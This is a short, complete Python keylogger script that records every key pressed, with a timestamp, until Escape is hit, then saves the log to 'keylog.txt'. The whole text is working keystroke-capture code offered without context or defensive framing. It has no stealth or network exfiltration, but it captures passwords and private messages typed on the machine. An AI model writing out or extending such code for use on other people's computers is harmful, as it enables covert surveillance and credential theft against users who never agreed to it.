import keyboard
from datetime import datetime

log = ""

def on_key_press(event):
    global log
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log += f"{timestamp}: {event.name}\n"

keyboard.on_press(on_key_press)

keyboard.wait('esc')

with open("keylog.txt", "w") as file:
    file.write(log)

print("Keylogger stopped. Check 'keylog.txt' for logs.")


